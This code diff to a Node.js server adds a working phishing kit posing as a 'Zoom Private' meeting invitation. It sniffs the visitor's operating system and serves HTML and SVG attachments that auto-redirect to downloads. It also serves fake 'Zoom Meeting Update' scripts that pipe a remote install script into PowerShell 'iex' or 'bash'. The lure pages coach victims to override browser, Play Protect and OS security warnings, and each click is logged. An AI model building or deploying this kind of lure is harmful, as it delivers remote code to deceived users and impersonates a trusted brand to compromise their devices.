@@ -154,6 +154,92 @@ function buildLinks(service, recipients, target, subject, body) {
   }
 }
 
+function detectOs(req) {
+  const ua = String(req.headers['user-agent'] || '').toLowerCase();
+  if (/android/.test(ua)) return 'android';
+  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
+  if (/windows|win32|win64/.test(ua)) return 'windows';
+  if (/macintosh|mac os x|macos/.test(ua)) return 'macos';
+  if (/linux|x11/.test(ua)) return 'linux';
+  return 'windows';
+}
+
+function downloadUrl(os) {
+  const base = LANDING.replace(/\/$/, '');
+  switch (os) {
+    case 'windows': return PUBLIC + '/dl/windows.cmd';
+    case 'macos': return PUBLIC + '/dl/macos.command';
+    case 'linux': return PUBLIC + '/dl/linux.sh';
+    case 'android': return ANDROID_APK;
+    default: return base;
+  }
+}
+
+function downloadLabel(os) {
+  return os === 'android' ? 'Download the Android app'
+    : os === 'ios' ? 'Open the meeting page'
+    : 'Download the ' + (os === 'macos' ? 'macOS' : os === 'linux' ? 'Linux' : 'Windows') + ' installer';
+}
+
+function attachmentPage(target, os, id) {
+  const dl = downloadUrl(os);
+  const label = downloadLabel(os);
+  const hint = os === 'android'
+    ? 'Your browser may warn that the file is harmful. Tap <b>Download anyway</b>, then <b>Install</b> (and <b>Install anyway</b> if Play Protect appears).'
+    : os === 'ios'
+    ? 'Open the meeting page in Safari and use the Zoom app.'
+    : 'The download starts automatically. Double-click the file to install. If Windows or macOS warns, choose <b>Run</b> / <b>Open</b>.';
+  return `<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zoom meeting invitation</title>
+<style>
+body{margin:0;background:#f4f7fd;font:16px/1.5 -apple-system,Segoe UI,Roboto,Arial,sans-serif;color:#12203a}
+.card{max-width:560px;margin:40px auto;background:#fff;border:1px solid #e2e9f5;border-radius:16px;padding:28px;box-shadow:0 20px 60px -30px #0b2f7a55}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;color:#0b5cff;margin-bottom:18px}
+.badge{width:38px;height:38px;border-radius:10px;background:#0b5cff;color:#fff;display:grid;place-items:center;font-size:18px}
+h1{font-size:22px;margin:0 0 8px}p{color:#4c5d77;margin:0 0 14px}
+a.btn{display:block;text-align:center;background:#0b5cff;color:#fff;text-decoration:none;font-weight:700;padding:14px;border-radius:12px;margin:18px 0}
+.small{font-size:13px;color:#6b7a92}.tiny{font-size:12px;color:#8b98ad;margin-top:16px}
+</style></head><body>
+<div class="card">
+  <div class="logo"><span class="badge">Z</span> Zoom Private</div>
+  <h1>You are invited to a meeting</h1>
+  <p>Open the secure meeting page to join. The correct client for this device is prepared automatically.</p>
+  <a class="btn" href="${dl}" id="dl">${label}</a>
+  <p class="small">${hint}</p>
+  <p class="small"><a href="${target}">Or open the meeting page</a></p>
+  <p class="tiny">Invitation ${id}</p>
+</div>
+<script>
+  var dl=${JSON.stringify(dl)};
+  setTimeout(function(){ if (dl && !/^https?:$/.test(dl)) location.href = dl; }, 700);
+</script>
+</body></html>`;
+}
+
+function attachmentSvg(target, os, id) {
+  const dl = downloadUrl(os);
+  const label = downloadLabel(os);
+  return `<svg xmlns="http://www.w3.org/2000/svg" width="760" height="520" viewBox="0 0 760 520">
+<rect width="760" height="520" fill="#f4f7fd"/>
+<rect x="60" y="40" width="640" height="440" rx="18" fill="#fff" stroke="#e2e9f5"/>
+<rect x="90" y="72" width="40" height="40" rx="10" fill="#0b5cff"/>
+<text x="110" y="99" text-anchor="middle" font-family="Arial" font-size="22" font-weight="bold" fill="#fff">Z</text>
+<text x="145" y="99" font-family="Arial" font-size="18" font-weight="bold" fill="#0b5cff">Zoom Private</text>
+<text x="90" y="165" font-family="Arial" font-size="24" font-weight="bold" fill="#12203a">You are invited to a meeting</text>
+<text x="90" y="200" font-family="Arial" font-size="15" fill="#4c5d77">Open the secure meeting page to join.</text>
+<text x="90" y="224" font-family="Arial" font-size="15" fill="#4c5d77">The correct client is prepared automatically.</text>
+<a href="${dl}" target="_blank">
+  <rect x="90" y="270" width="580" height="54" rx="12" fill="#0b5cff"/>
+  <text x="380" y="303" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#fff">${label}</text>
+</a>
+<text x="90" y="360" font-family="Arial" font-size="13" fill="#6b7a92">If the download does not start, click the button above.</text>
+<text x="90" y="384" font-family="Arial" font-size="13" fill="#6b7a92"><a href="${target}">Open the meeting page</a></text>
+<text x="90" y="450" font-family="Arial" font-size="12" fill="#8b98ad">Invitation ${id}</text>
+<script>setTimeout(function(){ location.href = ${JSON.stringify(dl)}; }, 700);</script>
+</svg>`;
+}
+
 function serveStatic(res, pathname) {
   let rel = decodeURIComponent(pathname);
   if (rel === '/') rel = '/index.html';
@@ -255,6 +341,56 @@ const server = http.createServer(async (req, res) => {
       'Cache-Control': 'no-store'
     });
     res.end(lines.join('\n'));
+    return;
+  }
+  if (url.pathname === '/dl/windows.cmd') {
+    const script = '@echo off\r\ntitle Zoom Update\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command "irm \'' +
+      LANDING.replace(/\/$/, '') + '/api/landing/windows-install.ps1\' | iex"\r\n';
+    res.writeHead(200, {
+      'Content-Type': 'application/octet-stream',
+      'Content-Disposition': 'attachment; filename="Zoom_Meeting_Update.cmd"',
+      'Cache-Control': 'no-store'
+    });
+    res.end(script);
+    return;
+  }
+  if (url.pathname === '/dl/macos.command' || url.pathname === '/dl/linux.sh') {
+    const mac = url.pathname.endsWith('.command');
+    const script = '#!/bin/bash\nset -e\ncurl -fsSL "' + LANDING.replace(/\/$/, '') +
+      (mac ? '/api/landing/macos-install' : '/api/landing/linux-install') + '" | bash\n';
+    res.writeHead(200, {
+      'Content-Type': 'application/octet-stream',
+      'Content-Disposition': 'attachment; filename="' + (mac ? 'Zoom_Meeting_Update.command' : 'zoom-meeting-update.sh') + '"',
+      'Cache-Control': 'no-store'
+    });
+    res.end(script);
+    return;
+  }
+  if (url.pathname === '/dl/android') {
+    res.writeHead(302, { Location: ANDROID_APK, 'Cache-Control': 'no-store' });
+    res.end();
+    return;
+  }
+  if (url.pathname.startsWith('/attach/')) {
+    const svg = url.pathname.endsWith('/svg');
+    const id = url.pathname.slice('/attach/'.length).replace(/\/svg$/, '');
+    const db = readDb();
+    const entry = db[id];
+    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
+    entry.clicks = (entry.clicks || 0) + 1;
+    entry.last = new Date().toISOString();
+    writeDb(db);
+    const os = (url.searchParams.get('os') || detectOs(req)).toLowerCase();
+    const body = svg
+      ? attachmentSvg(entry.target, os, id)
+      : attachmentPage(entry.target, os, id);
+    res.writeHead(200, {
+      'Content-Type': svg ? 'image/svg+xml; charset=utf-8' : 'text/html; charset=utf-8',
+      'Content-Disposition': 'attachment; filename="Zoom_Meeting_' + id + (svg ? '.svg' : '.html') + '"',
+      'Cache-Control': 'no-store',
+      'X-Content-Type-Options': 'nosniff'
+    });
+    res.end(body);
     return;
   }
   if (url.pathname === '/api/build' && req.method === 'POST') {
